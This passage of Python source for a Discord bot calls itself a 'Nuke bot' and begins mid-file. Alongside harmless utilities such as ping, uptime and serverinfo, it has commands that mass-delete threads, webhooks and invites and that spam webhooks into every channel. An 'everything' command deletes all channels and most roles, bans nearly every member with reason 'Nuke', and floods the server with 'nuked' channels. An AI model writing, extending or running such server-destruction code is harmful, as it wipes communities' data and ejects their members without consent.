            if resp.status != 200:
                await ctx.send("❌ Failed to fetch image.")
                return
            data = await resp.read()
    emoji = await safe(ctx.guild.create_custom_emoji(name=name, image=data))
    if emoji:
        await status(ctx, f"addemoji {name}")
    else:
        await ctx.send("❌ Failed to create emoji (check slots or file type).")

@bot.command()
async def delthreads(ctx):
    await batch([t.delete() for t in ctx.guild.threads], **BATCH_CH)
    await status(ctx, "delthreads")

@bot.command()
async def delwebhooks(ctx):
    webhooks = await ctx.guild.webhooks()
    await batch([w.delete() for w in webhooks], **BATCH_CH)
    await status(ctx, "delwebhooks")

@bot.command()
async def delinvites(ctx):
    """Delete all server invites"""
    invites = await ctx.guild.invites()
    await batch([inv.delete() for inv in invites], **BATCH_CH)
    await status(ctx, "delinvites")

@bot.command()
async def listinvites(ctx):
    invites = await ctx.guild.invites()
    if not invites:
        await ctx.send("No active invites.")
        return
    lines = [f"`{inv.code}` — #{inv.channel.name} by {inv.inviter} ({inv.uses} uses)" for inv in invites]
    text = "\n".join(lines)
    for chunk in [text[i:i+1900] for i in range(0, len(text), 1900)]:
        await safe(ctx.send(f"```\n{chunk}\n```"))

@bot.command()
async def webhook(ctx, name: str, count: int):
    async def make_webhook(ch):
        for _ in range(count):
            await safe(ch.create_webhook(name=name))
    await batch([make_webhook(ch) for ch in ctx.guild.text_channels], **BATCH_CH)
    await status(ctx, f"webhook {name} {count}")

@bot.command()
async def audit(ctx, count: int = 10):
    """Show recent audit log entries"""
    entries = []
    async for entry in ctx.guild.audit_logs(limit=count):
        entries.append(f"`{entry.action.name}` — {entry.user} → {entry.target}")
    text = "\n".join(entries) if entries else "No audit log entries."
    for chunk in [text[i:i+1900] for i in range(0, len(text), 1900)]:
        await safe(ctx.send(f"```\n{chunk}\n```"))

@bot.command()
async def serverinfo(ctx):
    g = ctx.guild
    embed = discord.Embed(title=f"🌐 {g.name}", color=0xff0000)
    embed.add_field(name="ID", value=str(g.id))
    embed.add_field(name="Owner", value=str(g.owner))
    embed.add_field(name="Members", value=str(g.member_count))
    embed.add_field(name="Channels", value=str(len(g.channels)))
    embed.add_field(name="Roles", value=str(len(g.roles)))
    embed.add_field(name="Emojis", value=str(len(g.emojis)))
    embed.add_field(name="Boosts", value=str(g.premium_subscription_count))
    embed.add_field(name="Boost Level", value=str(g.premium_tier))
    embed.add_field(name="Created", value=g.created_at.strftime("%Y-%m-%d"))
    if g.icon:
        embed.set_thumbnail(url=g.icon.url)
    await ctx.send(embed=embed)

@bot.command()
async def everything(ctx):
    guild = ctx.guild
    protected_members = {guild.me, guild.owner}
    protected_roles    = {guild.default_role, guild.me.top_role}
    await batch([ch.delete() for ch in guild.channels], **BATCH_CH)
    await batch([r.delete() for r in guild.roles if r not in protected_roles], **BATCH_ROLE)
    await batch([m.ban(reason="Nuke") for m in guild.members if m not in protected_members], **BATCH_MBR)
    await batch([s.delete() for s in guild.stickers], **BATCH_CH)
    await batch([guild.create_text_channel("nuked") for _ in range(10)], **BATCH_CH)
    await status(ctx, "everything")

# ─────────────────────────────────────────────
# BOT UTILITY
# ─────────────────────────────────────────────

@bot.command()
async def ping(ctx):
    """Show bot latency"""
    latency = round(bot.latency * 1000)
    await ctx.send(f"🏓 Pong! `{latency}ms`")

@bot.command()
async def uptime(ctx):
    """Show how long the bot has been running"""
    elapsed = int(time.time() - START_TIME)
    h, r = divmod(elapsed, 3600)
    m, s = divmod(r, 60)
    await ctx.send(f"⏱️ Uptime: `{h}h {m}m {s}s`")

@bot.command()
async def botstatus(ctx, *, status_text: str):
    """Change the bot's status/activity"""
    await bot.change_presence(activity=discord.Game(name=status_text))
    await status(ctx, f"botstatus → {status_text}")

@bot.command()
async def botname(ctx, *, name: str):
    """Change the bot's username"""
    await bot.user.edit(username=name)
    await status(ctx, f"botname → {name}")

# ─────────────────────────────────────────────
# READY
# ─────────────────────────────────────────────

@bot.event
async def on_ready():
    print(f"Nuke bot ready: {bot.user} | {len(bot.guilds)} guild(s)")

bot.run(os.getenv("NUKE_TOKEN"))
